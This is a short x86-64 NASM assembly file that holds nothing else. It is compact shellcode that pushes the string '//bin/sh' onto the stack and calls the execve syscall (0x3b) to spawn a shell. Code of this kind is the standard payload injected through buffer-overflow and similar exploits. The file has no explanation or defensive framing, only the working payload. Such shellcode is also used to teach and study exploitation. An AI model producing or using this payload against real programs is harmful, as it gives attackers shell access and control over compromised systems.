BITS 64
global _start

_start:
	xor rsi, rsi
	xor rdx,rdx
	push rdx
	mov rax, 0x68732f6e69622f2f
	push rax
	mov rdi, rsp
	xor rax,rax
	mov al, 0x3b
	syscall
